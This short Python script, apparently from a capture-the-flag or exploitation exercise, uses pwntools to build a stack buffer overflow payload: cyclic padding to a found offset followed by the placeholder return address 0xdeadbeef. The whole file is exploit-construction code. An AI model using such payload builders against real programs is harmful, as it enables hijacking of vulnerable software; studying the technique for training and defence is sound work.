#!/usr/bin/env python

from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0xdeadbeef)

payload = padding + eip

print(payload)

